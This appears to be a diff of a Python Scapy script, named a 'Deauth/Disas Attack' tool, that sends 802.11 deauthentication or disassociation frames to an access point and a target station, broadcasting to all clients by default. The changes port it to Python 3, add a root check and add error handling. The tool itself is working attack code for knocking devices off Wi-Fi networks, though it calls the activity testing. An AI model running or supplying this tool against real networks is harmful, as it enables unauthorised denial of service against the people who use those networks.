@@ -1,11 +1,11 @@
-#!/usr/bin/python
-from scapy.all import *  # version 2.4.0
+#!/usr/bin/python3
+from scapy.all import *
 import argparse
 import sys
 
 
 def banner():
-    bnr = "\033[36mDeauth/Disas Attack\033[00m 1.02a by <verifsec@gmail.com>\n"
+    bnr = '\033[36mDeauth/Disas Attack\033[00m 1.03 by <verifsec@gmail.com>\n'
     print(bnr)
 
 
@@ -24,11 +24,13 @@ def upper(message, index):
     return message[:index] + tmp.capitalize()
 
 
-if __name__ == "__main__":
+if __name__ == '__main__':
+    if os.geteuid() * os.getuid() != 0:
+        sys.exit('\033[31m[-]\033[00m You must run it as root!')
     banner()
     broadcast = 'ff:ff:ff:ff:ff:ff'
     parser = argparse.ArgumentParser()
-    parser.add_argument('-i', '--iface', help='802.11 iface(monitor)',required=True)
+    parser.add_argument('-i', '--iface', help='802.11 iface',required=True)
     parser.add_argument('-b', '--bssid', help='APUT MAC Address', required=True)
     parser.add_argument('-t', '--target', help='STAUT MAC Address', default=broadcast)
     parser.add_argument('-m', '--mode', help='"disas" or "deauth"', required=True)
@@ -56,10 +58,12 @@ if __name__ == "__main__":
             sendp(packet, verbose=0, iface=iface)
             sys.stdout.write('\r[%s] %s' % (cyl[i % 4], upper(msg, i % len(msg))))
             sys.stdout.flush()        
+    except OSError as err:
+        sys.exit('\033[31m[-]\033[00m ' + err.args[1] + '(' + iface + ')')
     except KeyboardInterrupt:
-        print("\n\n\033[31m+++ Testing aborted by user +++\033[00m")
+        print('\n\n\033[31m+++ Testing aborted by user +++\033[00m')
         sys.exit("\033[32m[+]\033[00m Are you OK? Hopefully it's nothing.")
     except Exception:
-        sys.exit("\033[31m[-]\033[00m Something is wrong. Use your brain.")
+        sys.exit('\033[31m[-]\033[00m Something is wrong. Use your brain.')
         
     print("\n\033[32m[+]\033[00m Finish. Hopefully it's nothing.")
